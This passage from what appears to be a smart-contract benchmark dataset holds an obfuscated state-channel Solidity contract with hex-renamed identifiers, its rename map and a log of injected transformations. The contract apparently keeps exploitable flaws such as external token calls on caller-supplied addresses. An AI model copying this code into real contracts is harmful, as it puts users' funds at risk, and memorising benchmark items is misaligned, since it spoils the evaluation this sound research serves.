0: balanceA 1:balanceI 2:depositedA 3:depositedI\n         uint256[2] _0x3f5ecf; // 0: eth 1: tokens\n         uint256 _0xa1e930;\n         uint256 _0x4d4c0a;\n         bytes32 VCrootHash;\n         uint256 LCopenTimeout;\n         uint256 _0x5d1e89; // when update LC times out\n         bool _0xf68155; // true when both parties have joined\n         bool _0xd1e492;\n         uint256 _0xf98110;\n         HumanStandardToken _0xfab703;\n     }\n\n     // virtual-channel state\n     struct VirtualChannel {\n         bool _0x941e28;\n         bool _0xb28295;\n         uint256 _0xa1e930;\n         address _0xd1ec16; // Initiator of challenge\n         uint256 _0xfba4e5; // when update VC times out\n         // channel state\n         address _0x0db2d4; // VC participant A\n         address _0x74588d; // VC participant B\n         address _0xa3d1d8; // LC hub\n         uint256[2] _0x33ffb0;\n         uint256[2] _0x7958d2;\n         uint256[2] _0xd57a30;\n         HumanStandardToken _0xfab703;\n     }\n\n     mapping(bytes32 => VirtualChannel) public _0xfe3dc7;\n     mapping(bytes32 => Channel) public Channels;\n\n     function _0x9deb1a(\n         bytes32 _0x80e22b,\n         address _0x90df38,\n         uint256 _0x4d2465,\n         address _0x0f9feb,\n         uint256[2] _0x638642 // [eth, token]\n     )\n         public\n         payable\n     {\n         require(Channels[_0x80e22b]._0xc63ab5[0] == address(0), \"Channel has already been created.\");\n         require(_0x90df38 != 0x0, \"No partyI address provided to LC creation\");\n         require(_0x638642[0] >= 0 && _0x638642[1] >= 0, \"Balances cannot be negative\");\n         // Set initial ledger channel state\n         // Alice must execute this and we assume the initial state\n         // to be signed from this requirement\n         // Alternative is to check a sig as in joinChannel\n         Channels[_0x80e22b]._0xc63ab5[0] = msg.sender;\n         Channels[_0x80e22b]._0xc63ab5[1] = _0x90df38;\n\n         if(_0x638642[0] != 0) {\n             require(msg.value == _0x638642[0], \"Eth balance does not match sent value\");\n             Channels[_0x80e22b]._0x33ffb0[0] = msg.value;\n         }\n         if(_0x638642[1] != 0) {\n             Channels[_0x80e22b]._0xfab703 = HumanStandardToken(_0x0f9feb);\n             require(Channels[_0x80e22b]._0xfab703._0x0a82db(msg.sender, this, _0x638642[1]),\"CreateChannel: token transfer failure\");\n             Channels[_0x80e22b]._0x7958d2[0] = _0x638642[1];\n         }\n\n         Channels[_0x80e22b]._0xa1e930 = 0;\n         Channels[_0x80e22b]._0x4d4c0a = _0x4d2465;\n         // is close flag, lc state sequence, number open vc, vc root hash, partyA...\n         //Channels[_lcID].stateHash = keccak256(uint256(0), uint256(0), uint256(0), bytes32(0x0), bytes32(msg.sender), bytes32(_partyI), balanceA, balanceI);\n         Channels[_0x80e22b].LCopenTimeout = _0x75c146 + _0x4d2465;\n         Channels[_0x80e22b]._0x3f5ecf = _0x638642;\n\n         emit DidLCOpen(_0x80e22b, msg.sender, _0x90df38, _0x638642[0], _0x0f9feb, _0x638642[1], Channels[_0x80e22b].LCopenTimeout);\n     }\n\n     function LCOpenTimeout(bytes32 _0x80e22b) public {\n         require(msg.sender == Channels[_0x80e22b]._0xc63ab5[0] && Channels[_0x80e22b]._0xf68155 == false);\n         require(_0x75c146 > Channels[_0x80e22b].LCopenTimeout);\n\n         if(Channels[_0x80e22b]._0x3f5ecf[0] != 0) {\n             Channels[_0x80e22b]._0xc63ab5[0].transfer(Channels[_0x80e22b]._0x33ffb0[0]);\n         }\n         if(Channels[_0x80e22b]._0x3f5ecf[1] != 0) {\n             require(Channels[_0x80e22b]._0xfab703.transfer(Channels[_0x80e22b]._0xc63ab5[0], Channels[_0x80e22b]._0x7958d2[0]),\"CreateChannel: token transfer failure\");\n         }\n\n         emit DidLCClose(_0x80e22b, 0, Channels[_0x80e22b]._0x33ffb0[0], Channels[_0x80e22b]._0x7958d2[0], 0, 0);\n\n         // only safe to delete since no action was taken on this channel\n         delete Channels[_0x80e22b];\n     }\n\n     function _0x8747a9(bytes32 _0x80e22b, uint256[2] _0x638642) public payable {\n         // require the channel is not open yet\n         require(Channels[_0x80e22b]._0xf68155 == false);\n         require(msg.sender == Channels[_0x80e22b]._0xc63ab5[1]);\n\n         if(_0x638642[0] != 0) {\n             require(msg.value == _0x638642[0], \"state balance does not match sent value\");\n             Channels[_0x80e22b]._0x33ffb0[1] = msg.value;\n         }\n         if(_0x638642[1] != 0) {\n             require(Channels[_0x80e22b]._0xfab703._0x0a82db(msg.sender, this, _0x638642[1]),\"joinChannel: token transfer failure\");\n             Channels[_0x80e22b]._0x7958d2[1] = _0x638642[1];\n         }\n\n         Channels[_0x80e22b]._0x3f5ecf[0]+=_0x638642[0];\n         Channels[_0x80e22b]._0x3f5ecf[1]+=_0x638642[1];\n         // no longer allow joining functions to be called\n         Channels[_0x80e22b]._0xf68155 = true;\n         _0xc692b1++;\n\n         emit DidLCJoin(_0x80e22b, _0x638642[0], _0x638642[1]);\n     }\n\n     // additive updates of monetary state\n     function _0x6a715e(bytes32 _0x80e22b, address _0x88c383, uint256 _0x3b0e12, bool _0x7838d6) public payable {\n         require(Channels[_0x80e22b]._0xf68155 == true, \"Tried adding funds to a closed channel\");\n         require(_0x88c383 == Channels[_0x80e22b]._0xc63ab5[0] || _0x88c383 == Channels[_0x80e22b]._0xc63ab5[1]);\n\n         //if(Channels[_lcID].token)\n\n         if (Channels[_0x80e22b]._0xc63ab5[0] == _0x88c383) {\n             if(_0x7838d6) {\n                 require(Channels[_0x80e22b]._0xfab703._0x0a82db(msg.sender, this, _0x3b0e12),\"deposit: token transfer failure\");\n                 Channels[_0x80e22b]._0x7958d2[2] += _0x3b0e12;\n             } else {\n                 require(msg.value == _0x3b0e12, \"state balance does not match sent value\");\n                 Channels[_0x80e22b]._0x33ffb0[2] += msg.value;\n             }\n         }\n\n         if (Channels[_0x80e22b]._0xc63ab5[1] == _0x88c383) {\n             if(_0x7838d6) {\n                 require(Channels[_0x80e22b]._0xfab703._0x0a82db(msg.sender, this, _0x3b0e12),\"deposit: token transfer failure\");\n                 Channels[_0x80e22b]._0x7958d2[3] += _0x3b0e12;\n             } else {\n                 require(msg.value == _0x3b0e12, \"state balance does not match sent value\");\n                 Channels[_0x80e22b]._0x33ffb0[3] += msg.value;\n             }\n         }\n\n         emit DidLCDeposit(_0x80e22b, _0x88c383, _0x3b0e12, _0x7838d6);\n     }\n\n     // TODO: Check there are no open virtual channels, the client should have cought this before signing a close LC state update\n     function _0x3bd56e(\n         bytes32 _0x80e22b,\n         uint256 _0xf68ae3,\n         uint256[4] _0x638642, // 0: ethBalanceA 1:ethBalanceI 2:tokenBalanceA 3:tokenBalanceI\n         string _0x8a2daf,\n         string _0x0f1e22\n     )\n         public\n     {\n         // assume num open vc is 0 and root hash is 0x0\n         //require(Channels[_lcID].sequence < _sequence);\n         require(Channels[_0x80e22b]._0xf68155 == true);\n         uint256 _0x4e2101 = Channels[_0x80e22b]._0x3f5ecf[0] + Channels[_0x80e22b]._0x33ffb0[2] + Channels[_0x80e22b]._0x33ffb0[3];\n         uint256 _0xf6f5f1 = Channels[_0x80e22b]._0x3f5ecf[1] + Channels[_0x80e22b]._0x7958d2[2] + Channels[_0x80e22b]._0x7958d2[3];\n         require(_0x4e2101 == _0x638642[0] + _0x638642[1]);\n         require(_0xf6f5f1 == _0x638642[2] + _0x638642[3]);\n\n         bytes32 _0xd19bc9 = _0x1d7afd(\n             abi._0x7946b2(\n                 _0x80e22b,\n                 true,\n                 _0xf68ae3,\n                 uint256(0),\n                 bytes32(0x0),\n                 Channels[_0x80e22b]._0xc63ab5[0],\n                 Channels[_0x80e22b]._0xc63ab5[1],\n                 _0x638642[0],\n                 _0x638642[1],\n                 _0x638642[2],\n                 _0x638642[3]\n             )\n         );\n\n         require(Channels[_0x80e22b]._0xc63ab5[0] == ECTools._0x0b0492(_0xd19bc9, _0x8a2daf));\n         require(Channels[_0x80e22b]._0xc63ab5[1] == ECTools._0x0b0492(_0xd19bc9, _0x0f1e22));\n\n         Channels[_0x80e22b]._0xf68155 = false;\n\n         if(_0x638642[0] != 0 || _0x638642[1] != 0) {\n             Channels[_0x80e22b]._0xc63ab5[0].transfer(_0x638642[0]);\n             Channels[_0x80e22b]._0xc63ab5[1].transfer(_0x638642[1]);\n         }\n\n         if(_0x638642[2] != 0 || _0x638642[3] != 0) {\n             require(Channels[_0x80e22b]._0xfab703.transfer(Channels[_0x80e22b]._0xc63ab5[0], _0x638642[2]),\"happyCloseChannel: token transfer failure\");\n             require(Channels[_0x80e22b]._0xfab703.transfer(Channels[_0x80e22b]._0xc63ab5[1], _0x638642[3]),\"happyCloseChannel: token transfer failure\");\n         }\n\n         _0xc692b1--;\n\n         emit DidLCClose(_0x80e22b, _0xf68ae3, _0x638642[0], _0x638642[1], _0x638642[2], _0x638642[3]);\n     }\n\n     // Byzantine functions\n\n     function _0x0b27c8(\n         bytes32 _0x80e22b,\n         uint256[6] _0x393506, // [sequence, numOpenVc, ethbalanceA, ethbalanceI, tokenbalanceA, tokenbalanceI]\n         bytes32 _0xa83053,\n         string _0x8a2daf,\n         string _0x0f1e22\n     )\n         public\n     {\n         Channel storage _0xcdd2dc = Channels[_0x80e22b];\n         require(_0xcdd2dc._0xf68155);\n         require(_0xcdd2dc._0xa1e930 < _0x393506[0]); // do same as vc sequence check\n         require(_0xcdd2dc._0x33ffb0[0] + _0xcdd2dc._0x33ffb0[1] >= _0x393506[2] + _0x393506[3]);\n         require(_0xcdd2dc._0x7958d2[0] + _0xcdd2dc._0x7958d2[1] >= _0x393506[4] + _0x393506[5]);\n\n         if(_0xcdd2dc._0xd1e492 == true) {\n             require(_0xcdd2dc._0x5d1e89 > _0x75c146);\n         }\n\n         bytes32 _0xd19bc9 = _0x1d7afd(\n             abi._0x7946b2(\n                 _0x80e22b,\n                 false,\n                 _0x393506[0],\n                 _0x393506[1],\n                 _0xa83053,\n                 _0xcdd2dc._0xc63ab5[0],\n                 _0xcdd2dc._0xc63ab5[1],\n                 _0x393506[2],\n                 _0x393506[3],\n                 _0x393506[4],\n                 _0x393506[5]\n             )\n         );\n\n         require(_0xcdd2dc._0xc63ab5[0] == ECTools._0x0b0492(_0xd19bc9, _0x8a2daf));\n         require(_0xcdd2dc._0xc63ab5[1] == ECTools._0x0b0492(_0xd19bc9, _0x0f1e22));\n\n         // update LC state\n         _0xcdd2dc._0xa1e930 = _0x393506[0];\n         _0xcdd2dc._0xf98110 = _0x393506[1];\n         _0xcdd2dc._0x33ffb0[0] = _0x393506[2];\n         _0xcdd2dc._0x33ffb0[1] = _0x393506[3];\n         _0xcdd2dc._0x7958d2[0] = _0x393506[4];\n         _0xcdd2dc._0x7958d2[1] = _0x393506[5];\n         _0xcdd2dc.VCrootHash = _0xa83053;\n         _0xcdd2dc._0xd1e492 = true;\n         _0xcdd2dc._0x5d1e89 = _0x75c146 + _0xcdd2dc._0x4d4c0a;\n\n         // make settlement flag\n\n         emit DidLCUpdateState (\n             _0x80e22b,\n             _0x393506[0],\n             _0x393506[1],\n             _0x393506[2],\n             _0x393506[3],\n             _0x393506[4],\n             _0x393506[5],\n             _0xa83053,\n             _0xcdd2dc._0x5d1e89\n         );\n     }\n\n     // supply initial state of VC to \"prime\" the force push game\n     function _0x2c9ae9(\n         bytes32 _0x80e22b,\n         bytes32 _0x5db868,\n         bytes _0x1a61e2,\n         address _0xc41b08,\n         address _0x6981b4,\n         uint256[2] _0x9fb9fb,\n         uint256[4] _0x638642, // 0: ethBalanceA 1:ethBalanceI 2:tokenBalanceA 3:tokenBalanceI\n         string _0x8ee06f\n     )\n         public\n     {\n         require(Channels[_0x80e22b]._0xf68155, \"LC is closed.\");\n         // sub-channel must be open\n         require(!_0xfe3dc7[_0x5db868]._0x941e28, \"VC is closed.\");\n         // Check time has passed on updateLCtimeout and has not passed the time to store a vc state\n         require(Channels[_0x80e22b]._0x5d1e89 < _0x75c146, \"LC timeout not over.\");\n         // prevent rentry of initializing vc state\n         require(_0xfe3dc7[_0x5db868]._0xfba4e5 == 0);\n         // partyB is now Ingrid\n         bytes32 _0xf8c356 = _0x1d7afd(\n             abi._0x7946b2(_0x5db868, uint256(0), _0xc41b08, _0x6981b4, _0x9fb9fb[0], _0x9fb9fb[1], _0x638642[0], _0x638642[1], _0x638642[2], _0x638642[3])\n         );\n\n         // Make sure Alice has signed initial vc state (A/B in oldState)\n         require(_0xc41b08 == ECTools._0x0b0492(_0xf8c356, _0x8ee06f));\n\n         // Check the oldState is in the root hash\n         require(_0xd3d56e(_0xf8c356, _0x1a61e2, Channels[_0x80e22b].VCrootHash) == true);\n\n         _0xfe3dc7[_0x5db868]._0x0db2d4 = _0xc41b08; // VC participant A\n         _0xfe3dc7[_0x5db868]._0x74588d = _0x6981b4; // VC participant B\n         _0xfe3dc7[_0x5db868]._0xa1e930 = uint256(0);\n         _0xfe3dc7[_0x5db868]._0x33ffb0[0] = _0x638642[0];\n         _0xfe3dc7[_0x5db868]._0x33ffb0[1] = _0x638642[1];\n         _0xfe3dc7[_0x5db868]._0x7958d2[0] = _0x638642[2];\n         _0xfe3dc7[_0x5db868]._0x7958d2[1] = _0x638642[3];\n         _0xfe3dc7[_0x5db868]._0xd57a30 = _0x9fb9fb;\n         _0xfe3dc7[_0x5db868]._0xfba4e5 = _0x75c146 + Channels[_0x80e22b]._0x4d4c0a;\n         _0xfe3dc7[_0x5db868]._0xb28295 = true;\n\n         emit DidVCInit(_0x80e22b, _0x5db868, _0x1a61e2, uint256(0), _0xc41b08, _0x6981b4, _0x638642[0], _0x638642[1]);\n     }\n\n     //TODO: verify state transition since the hub did not agree to this state\n     // make sure the A/B balances are not beyond ingrids bonds\n     // Params: vc init state, vc final balance, vcID\n     function _0x189945(\n         bytes32 _0x80e22b,\n         bytes32 _0x5db868,\n         uint256 _0x454d08,\n         address _0xc41b08,\n         address _0x6981b4,\n         uint256[4] _0x23a165, // [ethupdateBalA, ethupdateBalB, tokenupdateBalA, tokenupdateBalB]\n         string _0x8ee06f\n     )\n         public\n     {\n         require(Channels[_0x80e22b]._0xf68155, \"LC is closed.\");\n         // sub-channel must be open\n         require(!_0xfe3dc7[_0x5db868]._0x941e28, \"VC is closed.\");\n         require(_0xfe3dc7[_0x5db868]._0xa1e930 < _0x454d08, \"VC sequence is higher than update sequence.\");\n         require(\n             _0xfe3dc7[_0x5db868]._0x33ffb0[1] < _0x23a165[1] && _0xfe3dc7[_0x5db868]._0x7958d2[1] < _0x23a165[3],\n             \"State updates may only increase recipient balance.\"\n         );\n         require(\n             _0xfe3dc7[_0x5db868]._0xd57a30[0] == _0x23a165[0] + _0x23a165[1] &&\n             _0xfe3dc7[_0x5db868]._0xd57a30[1] == _0x23a165[2] + _0x23a165[3],\n             \"Incorrect balances for bonded amount\");\n         // Check time has passed on updateLCtimeout and has not passed the time to store a vc state\n         // virtualChannels[_vcID].updateVCtimeout should be 0 on uninitialized vc state, and this should\n         // fail if initVC() isn't called first\n         // require(Channels[_lcID].updateLCtimeout < now && now < virtualChannels[_vcID].updateVCtimeout);\n         require(Channels[_0x80e22b]._0x5d1e89 < _0x75c146); // for testing!\n\n         bytes32 _0xba447c = _0x1d7afd(\n             abi._0x7946b2(\n                 _0x5db868,\n                 _0x454d08,\n                 _0xc41b08,\n                 _0x6981b4,\n                 _0xfe3dc7[_0x5db868]._0xd57a30[0],\n                 _0xfe3dc7[_0x5db868]._0xd57a30[1],\n                 _0x23a165[0],\n                 _0x23a165[1],\n                 _0x23a165[2],\n                 _0x23a165[3]\n             )\n         );\n\n         // Make sure Alice has signed a higher sequence new state\n         require(_0xfe3dc7[_0x5db868]._0x0db2d4 == ECTools._0x0b0492(_0xba447c, _0x8ee06f));\n\n         // store VC data\n         // we may want to record who is initiating on-chain settles\n         _0xfe3dc7[_0x5db868]._0xd1ec16 = msg.sender;\n         _0xfe3dc7[_0x5db868]._0xa1e930 = _0x454d08;\n\n         // channel state\n         _0xfe3dc7[_0x5db868]._0x33ffb0[0] = _0x23a165[0];\n         _0xfe3dc7[_0x5db868]._0x33ffb0[1] = _0x23a165[1];\n         _0xfe3dc7[_0x5db868]._0x7958d2[0] = _0x23a165[2];\n         _0xfe3dc7[_0x5db868]._0x7958d2[1] = _0x23a165[3];\n\n         _0xfe3dc7[_0x5db868]._0xfba4e5 = _0x75c146 + Channels[_0x80e22b]._0x4d4c0a;\n\n         emit DidVCSettle(_0x80e22b, _0x5db868, _0x454d08, _0x23a165[0], _0x23a165[1], msg.sender, _0xfe3dc7[_0x5db868]._0xfba4e5);\n     }\n\n     function _0xbc399c(bytes32 _0x80e22b, bytes32 _0x5db868) public {\n         // require(updateLCtimeout > now)\n         require(Channels[_0x80e22b]._0xf68155, \"LC is closed.\");\n         require(_0xfe3dc7[_0x5db868]._0xb28295, \"VC is not in settlement state.\");\n         require(_0xfe3dc7[_0x5db868]._0xfba4e5 < _0x75c146, \"Update vc timeout has not elapsed.\");\n         require(!_0xfe3dc7[_0x5db868]._0x941e28, \"VC is already closed\");\n         // reduce the number of open virtual channels stored on LC\n         Channels[_0x80e22b]._0xf98110--;\n         // close vc flags\n         _0xfe3dc7[_0x5db868]._0x941e28 = true;\n         // re-introduce the balances back into the LC state from the settled VC\n         // decide if this lc is alice or bob in the vc\n         if(_0xfe3dc7[_0x5db868]._0x0db2d4 == Channels[_0x80e22b]._0xc63ab5[0]) {\n             Channels[_0x80e22b]._0x33ffb0[0] += _0xfe3dc7[_0x5db868]._0x33ffb0[0];\n             Channels[_0x80e22b]._0x33ffb0[1] += _0xfe3dc7[_0x5db868]._0x33ffb0[1];\n\n             Channels[_0x80e22b]._0x7958d2[0] += _0xfe3dc7[_0x5db868]._0x7958d2[0];\n             Channels[_0x80e22b]._0x7958d2[1] += _0xfe3dc7[_0x5db868]._0x7958d2[1];\n         } else if (_0xfe3dc7[_0x5db868]._0x74588d == Channels[_0x80e22b]._0xc63ab5[0]) {\n             Channels[_0x80e22b]._0x33ffb0[0] += _0xfe3dc7[_0x5db868]._0x33ffb0[1];\n             Channels[_0x80e22b]._0x33ffb0[1] += _0xfe3dc7[_0x5db868]._0x33ffb0[0];\n\n             Channels[_0x80e22b]._0x7958d2[0] += _0xfe3dc7[_0x5db868]._0x7958d2[1];\n             Channels[_0x80e22b]._0x7958d2[1] += _0xfe3dc7[_0x5db868]._0x7958d2[0];\n         }\n\n         emit DidVCClose(_0x80e22b, _0x5db868, _0xfe3dc7[_0x5db868]._0x7958d2[0], _0xfe3dc7[_0x5db868]._0x7958d2[1]);\n     }\n\n     // todo: allow ethier lc.end-user to nullify the settled LC state and return to off-chain\n     function _0xbb69d5(bytes32 _0x80e22b) public {\n         Channel storage _0xcdd2dc = Channels[_0x80e22b];\n\n         // check settlement flag\n         require(_0xcdd2dc._0xf68155, \"Channel is not open\");\n         require(_0xcdd2dc._0xd1e492 == true);\n         require(_0xcdd2dc._0xf98110 == 0);\n         require(_0xcdd2dc._0x5d1e89 < _0x75c146, \"LC timeout over.\");\n\n         // if off chain state update didnt reblance deposits, just return to deposit owner\n         uint256 _0x4e2101 = _0xcdd2dc._0x3f5ecf[0] + _0xcdd2dc._0x33ffb0[2] + _0xcdd2dc._0x33ffb0[3];\n         uint256 _0xf6f5f1 = _0xcdd2dc._0x3f5ecf[1] + _0xcdd2dc._0x7958d2[2] + _0xcdd2dc._0x7958d2[3];\n\n         uint256 _0x8aa15c = _0xcdd2dc._0x33ffb0[0] + _0xcdd2dc._0x33ffb0[1];\n         uint256 _0x2a96ce = _0xcdd2dc._0x7958d2[0] + _0xcdd2dc._0x7958d2[1];\n\n         if(_0x8aa15c < _0x4e2101) {\n             _0xcdd2dc._0x33ffb0[0]+=_0xcdd2dc._0x33ffb0[2];\n             _0xcdd2dc._0x33ffb0[1]+=_0xcdd2dc._0x33ffb0[3];\n         } else {\n             require(_0x8aa15c == _0x4e2101);\n         }\n\n         if(_0x2a96ce < _0xf6f5f1) {\n             _0xcdd2dc._0x7958d2[0]+=_0xcdd2dc._0x7958d2[2];\n             _0xcdd2dc._0x7958d2[1]+=_0xcdd2dc._0x7958d2[3];\n         } else {\n             require(_0x2a96ce == _0xf6f5f1);\n         }\n\n         uint256 _0xd14fdf = _0xcdd2dc._0x33ffb0[0];\n         uint256 _0xcc4f63 = _0xcdd2dc._0x33ffb0[1];\n         uint256 _0xb2c9df = _0xcdd2dc._0x7958d2[0];\n         uint256 _0xb6c131 = _0xcdd2dc._0x7958d2[1];\n\n         _0xcdd2dc._0x33ffb0[0] = 0;\n         _0xcdd2dc._0x33ffb0[1] = 0;\n         _0xcdd2dc._0x7958d2[0] = 0;\n         _0xcdd2dc._0x7958d2[1] = 0;\n\n         if(_0xd14fdf != 0 || _0xcc4f63 != 0) {\n             _0xcdd2dc._0xc63ab5[0].transfer(_0xd14fdf);\n             _0xcdd2dc._0xc63ab5[1].transfer(_0xcc4f63);\n         }\n\n         if(_0xb2c9df != 0 || _0xb6c131 != 0) {\n             require(\n                 _0xcdd2dc._0xfab703.transfer(_0xcdd2dc._0xc63ab5[0], _0xb2c9df),\n                 \"byzantineCloseChannel: token transfer failure\"\n             );\n             require(\n                 _0xcdd2dc._0xfab703.transfer(_0xcdd2dc._0xc63ab5[1], _0xb6c131),\n                 \"byzantineCloseChannel: token transfer failure\"\n             );\n         }\n\n         _0xcdd2dc._0xf68155 = false;\n         _0xc692b1--;\n\n         emit DidLCClose(_0x80e22b, _0xcdd2dc._0xa1e930, _0xd14fdf, _0xcc4f63, _0xb2c9df, _0xb6c131);\n     }\n\n     function _0xd3d56e(bytes32 _0x52ac86, bytes _0x1a61e2, bytes32 _0xb6284d) internal pure returns (bool) {\n         bytes32 _0x5e8107 = _0x52ac86;\n         bytes32 _0xcac0ea;\n\n         for (uint256 i = 64; i <= _0x1a61e2.length; i += 32) {\n             assembly { _0xcac0ea := mload(add(_0x1a61e2, i)) }\n\n             if (_0x5e8107 < _0xcac0ea) {\n                 if (block.timestamp > 0) { _0x5e8107 = _0x1d7afd(abi._0x7946b2(_0x5e8107, _0xcac0ea)); }\n             } else {\n                 _0x5e8107 = _0x1d7afd(abi._0x7946b2(_0xcac0ea, _0x5e8107));\n             }\n         }\n\n         return _0x5e8107 == _0xb6284d;\n     }\n\n     //Struct Getters\n     function _0x1dc169(bytes32 _0xff0402) public view returns (\n         address[2],\n         uint256[4],\n         uint256[4],\n         uint256[2],\n         uint256,\n         uint256,\n         bytes32,\n         uint256,\n         uint256,\n         bool,\n         bool,\n         uint256\n     ) {\n         Channel memory _0xcdd2dc = Channels[_0xff0402];\n         return (\n             _0xcdd2dc._0xc63ab5,\n             _0xcdd2dc._0x33ffb0,\n             _0xcdd2dc._0x7958d2,\n             _0xcdd2dc._0x3f5ecf,\n             _0xcdd2dc._0xa1e930,\n             _0xcdd2dc._0x4d4c0a,\n             _0xcdd2dc.VCrootHash,\n             _0xcdd2dc.LCopenTimeout,\n             _0xcdd2dc._0x5d1e89,\n             _0xcdd2dc._0xf68155,\n             _0xcdd2dc._0xd1e492,\n             _0xcdd2dc._0xf98110\n         );\n     }\n\n     function _0x3a6818(bytes32 _0xff0402) public view returns(\n         bool,\n         bool,\n         uint256,\n         address,\n         uint256,\n         address,\n         address,\n         address,\n         uint256[2],\n         uint256[2],\n         uint256[2]\n     ) {\n         VirtualChannel memory _0x63ef33 = _0xfe3dc7[_0xff0402];\n         return(\n             _0x63ef33._0x941e28,\n             _0x63ef33._0xb28295,\n             _0x63ef33._0xa1e930,\n             _0x63ef33._0xd1ec16,\n             _0x63ef33._0xfba4e5,\n             _0x63ef33._0x0db2d4,\n             _0x63ef33._0x74588d,\n             _0x63ef33._0xa3d1d8,\n             _0x63ef33._0x33ffb0,\n             _0x63ef33._0x7958d2,\n             _0x63ef33._0xd57a30\n         );\n     }\n }\n",
      "rename_map": {
        "possibleTotalTokenBeforeDeposit": "_0x2a96ce",
        "possibleTotalEthBeforeDeposit": "_0x8aa15c",
        "toEthereumSignedMessage": "_0x1f8c57",
        "consensusCloseChannel": "_0x3bd56e",
        "byzantineCloseChannel": "_0xbb69d5",
        "isInSettlementState": "_0xb28295",
        "closeVirtualChannel": "_0xbc399c",
        "isUpdateLCSettling": "_0xd1e492",
        "totalTokenDeposit": "_0xf6f5f1",
        "getVirtualChannel": "_0x3a6818",
        "totalEthDeposit": "_0x4e2101",
        "virtualChannels": "_0xfe3dc7",
        "updateLCtimeout": "_0x5d1e89",
        "updateVCtimeout": "_0xfba4e5",
        "virtualChannel": "_0x63ef33",
        "approveAndCall": "_0x9ec0df",
        "_initialAmount": "_0xf3fe41",
        "parseInt16Char": "_0xfa00dd",
        "partyAddresses": "_0xc63ab5",
        "initialDeposit": "_0x3f5ecf",
        "tokenbalanceI": "_0xb6c131",
        "tokenbalanceA": "_0xb2c9df",
        "hexstrToBytes": "_0x974b5d",
        "erc20Balances": "_0x7958d2",
        "tokenBalanceI": "_0x155809",
        "createChannel": "_0x9deb1a",
        "updateLCstate": "_0x0b27c8",
        "_decimalUnits": "_0x015283",
        "tokenBalanceA": "_0x03c1f1",
        "recoverSigner": "_0x0b0492",
        "uintToBytes32": "_0x013293",
        "_isContained": "_0xd3d56e",
        "transferFrom": "_0x0a82db",
        "prefixedHash": "_0xdb6445",
        "encodePacked": "_0x7946b2",
        "uintToString": "_0x36eefd",
        "updateParams": "_0x393506",
        "_updateState": "_0xba447c",
        "_confirmTime": "_0x4d2465",
        "_tokenSymbol": "_0x67e766",
        "ethBalanceA": "_0xae3fa3",
        "ethbalanceI": "_0xcc4f63",
        "joinChannel": "_0x8747a9",
        "confirmTime": "_0x4d4c0a",
        "ethBalanceI": "_0x7caf32",
        "totalSupply": "_0x94d9b0",
        "numChannels": "_0xc692b1",
        "_startIndex": "_0xcd6055",
        "ethbalanceA": "_0xd14fdf",
        "ethBalances": "_0x33ffb0",
        "initVCstate": "_0x2c9ae9",
        "_extraData": "_0x3e8e55",
        "challenger": "_0xd1ec16",
        "isSignedBy": "_0xb9154c",
        "_initState": "_0xf8c356",
        "updateBalB": "_0x30626e",
        "_hashedMsg": "_0x81c4eb",
        "_tokenName": "_0x102938",
        "getChannel": "_0x1dc169",
        "updateBalA": "_0xd109e0",
        "balanceOf": "_0xf0c1cd",
        "numOpenVC": "_0xf98110",
        "channelId": "_0x572b8c",
        "remainder": "_0x0166ab",
        "substring": "_0x5e3474",
        "updateSeq": "_0x454d08",
        "updateBal": "_0x23a165",
        "allowance": "_0x6f75ce",
        "numOpenVc": "_0x6d37dc",
        "_endIndex": "_0x86694c",
        "_balances": "_0x638642",
        "_sequence": "_0xf68ae3",
        "recipient": "_0x88c383",
        "remaining": "_0x877bd0",
        "ecrecover": "_0x5e875e",
        "keccak256": "_0x1d7afd",
        "proofElem": "_0xcac0ea",
        "sequence": "_0xa1e930",
        "balanceB": "_0x37239e",
        "decimals": "_0x639a00",
        "strBytes": "_0x2c3fc4",
        "settleVC": "_0x189945",
        "_balance": "_0x3b0e12",
        "balanceA": "_0xd447d6",
        "_spender": "_0x23ec63",
        "balances": "_0xd697d7",
        "isToken": "_0x7838d6",
        "allowed": "_0x785c9a",
        "_partyB": "_0x6981b4",
        "approve": "_0x9cac6d",
        "isClose": "_0x941e28",
        "_hexstr": "_0xc6b3b0",
        "version": "_0x343805",
        "_partyA": "_0xc41b08",
        "_partyI": "_0x90df38",
        "deposit": "_0x6a715e",
        "channel": "_0xcdd2dc",
        "bresult": "_0xf20652",
        "_VCroot": "_0xa83053",
        "success": "_0xee96a3",
        "cursor": "_0x5e8107",
        "partyA": "_0x0db2d4",
        "_proof": "_0x1a61e2",
        "prefix": "_0x4c7132",
        "isOpen": "_0xf68155",
        "_owner": "_0xc98d14",
        "partyI": "_0xa3d1d8",
        "_token": "_0x0f9feb",
        "_value": "_0x54722c",
        "_state": "_0xd19bc9",
        "result": "_0xac0911",
        "symbol": "_0x45e7f2",
        "partyB": "_0x74588d",
        "vcRoot": "_0x3832b4",
        "_sigA": "_0x8a2daf",
        "_lcID": "_0x80e22b",
        "_hash": "_0x52ac86",
        "_addr": "_0x8e0dc1",
        "token": "_0xfab703",
        "_sigI": "_0x0f1e22",
        "_bond": "_0x9fb9fb",
        "_from": "_0x280a17",
        "proof": "_0x674fa3",
        "_uint": "_0x2c1d82",
        "_vcID": "_0x5db868",
        "_char": "_0x1aeafa",
        "_root": "_0xb6284d",
        "bstr": "_0x80374d",
        "_sig": "_0x6c0dd4",
        "_msg": "_0x83e756",
        "bond": "_0xd57a30",
        "_str": "_0x012db8",
        "vcId": "_0x434ed0",
        "lcId": "_0xb138e2",
        "sigA": "_0x8ee06f",
        "name": "_0x1e5d7b",
        "now": "_0x75c146",
        "_to": "_0x84adaa",
        "str": "_0xc259a9",
        "len": "_0xdb8135",
        "id": "_0xff0402"
      },
      "changes": [
        "Renamed 141 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_212",
      "transformed_id": "ss_l4_medium_sn_ds_212",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
